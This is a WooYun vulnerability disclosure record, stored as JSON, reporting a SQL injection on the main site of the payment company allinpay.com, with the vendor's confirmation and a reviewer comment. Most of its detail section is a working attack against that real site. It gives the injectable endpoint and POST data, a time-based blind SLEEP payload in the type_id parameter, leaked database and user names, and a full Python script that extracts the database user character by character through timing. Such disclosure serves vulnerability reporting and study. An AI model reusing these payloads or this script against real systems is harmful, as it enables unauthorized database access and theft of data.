{"id": 73992, "wybug_id": "wooyun-2015-0165611", "wybug_title": "通联支付www主站存在SQL注入漏洞（附利用脚本）", "wybug_corp": "allinpay.com", "wybug_author": "JutaZ", "wybug_date": "2015-12-29 10:04", "wybug_open_date": "2016-02-09 23:29", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向公众公开  简要描述： 通联支付www主站存在SQL注入漏洞（附利用脚本） 详细说明：  #1注入点 \nhttp://www.allinpay.com/httpHandler.php?Handler.Default.SendSpecialMerchants post数据: frm_sm_01=e&frm_sm_02=e&frm_sm_03=e&frm_sm_04=e&frm_sm_05=e&frm_sm_06=e&frm_sm_07=e&frm_sm_08=e&frm_sm_09=e&frm_sm_10%5B%5D=e&frm_sm_11=e&frm_sm_12=e&frm_sm_13%5B%5D=e&frm_sm_14=e&frm_sm_16=e&frm_sm_17%5B%5D=e&frm_sm_18=e&frm_sm_19%5B%5D=e&frm_sm_20=e&frm_sm_22=e&frm_sm_23=e&frm_sm_24=e&frm_sm_25=e&frm_sm_26=e&frm_sm_27=e&frm_sm_28=e&frm_sm_29=e&frm_sm_30=e&frm_sm_31=e&frm_sm_32=e&frm_sm_33=e&frm_sm_35=e&frm_sm_36=e&frm_sm_37=&frm_sm_38=%E8%AF%B7%E9%80%89%E6%8B%A9%E7%9C%81&frm_sm_39=%E8%AF%B7%E9%80%89%E6%8B%A9%E5%B8%82&type_id= 注入参数：type_id\n#2注入参数 \nhttp://www.allinpay.com/httpHandler.php?Handler.Default.SendSpecialMerchants post数据： frm_sm_01=e&frm_sm_02=e&frm_sm_03=e&frm_sm_04=e&frm_sm_05=e&frm_sm_06=e&frm_sm_07=e&frm_sm_08=e&frm_sm_09=e&frm_sm_10%5B%5D=e&frm_sm_11=e&frm_sm_12=e&frm_sm_13%5B%5D=e&frm_sm_14=e&frm_sm_16=e&frm_sm_17%5B%5D=e&frm_sm_18=e&frm_sm_19%5B%5D=e&frm_sm_20=e&frm_sm_22=e&frm_sm_23=e&frm_sm_24=e&frm_sm_25=e&frm_sm_26=e&frm_sm_27=e&frm_sm_28=e&frm_sm_29=e&frm_sm_30=e&frm_sm_31=e&frm_sm_32=e&frm_sm_33=e&frm_sm_35=e&frm_sm_36=e&frm_sm_37=&frm_sm_38=%E8%AF%B7%E9%80%89%E6%8B%A9%E7%9C%81&frm_sm_39=%E8%AF%B7%E9%80%89%E6%8B%A9%E5%B8%82&type_id=(SELECT * FROM (SELECT(SLEEP(6)))JutaZ)\n SLEEP，6秒后成功打开网页    漏洞证明：  数据库：allinpay数据库用户：aipweb3_admin@aipweb2#3 利用代码\n#!/usr/bin/env python# encoding: utf-8# allinpay.py # zzetao@hotmail.comimport requestsimport timeimport sysreload(sys)sys.setdefaultencoding('utf-8')payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')for i in range(1,22):    for strstr in payloads:\t\tstart_time = time.time()\t\turl = \"http://www.allinpay.com/httpHandler.php?Handler.Default.SendSpecialMerchants\"\t\tsql_data = {'frm_sm_01':'e','frm_sm_02':'e','frm_sm_03':'e','frm_sm_04':'e','frm_sm_05':'e','frm_sm_06':'e','frm_sm_07':'e','frm_sm_08':'e','frm_sm_09':'e','frm_sm_10%5B%5D':'e','frm_sm_11':'e','frm_sm_12':'e','frm_sm_13%5B%5D':'e','frm_sm_14':'e','frm_sm_16':'e','frm_sm_17%5B%5D':'e','frm_sm_18':'e','frm_sm_19%5B%5D':'e','frm_sm_20':'e','frm_sm_22':'e','frm_sm_23':'e','frm_sm_24':'e','frm_sm_25':'e','frm_sm_26':'e','frm_sm_27':'e','frm_sm_28':'e','frm_sm_29':'e','frm_sm_30':'e','frm_sm_31':'e','frm_sm_32':'e','frm_sm_33':'e','frm_sm_35':'e','frm_sm_36':'e','frm_sm_37':'','frm_sm_38':'%E8%AF%B7%E9%80%89%E6%8B%A9%E7%9C%81','frm_sm_39':'%E8%AF%B7%E9%80%89%E6%8B%A9%E5%B8%82','type_id':'(SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(USER()),' + str(i) + ',1))=' + str(ord(strstr)) + ')*5)))JutaZ)'}\t\tresult = requests.post(url,sql_data).text\t\tif(time.time() - start_time) > 5:\t\t    print \"number\"+str(i)+\":\"+strstr\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 JutaZ@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-12-29 16:22 厂商回复： 谢谢您的关注，已提交研发进行整改。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-31 17:16 |    \t\txFrank \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 专注Android系统安全)\t\t \n  贵公司负责处理漏洞交涉的不是研发？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}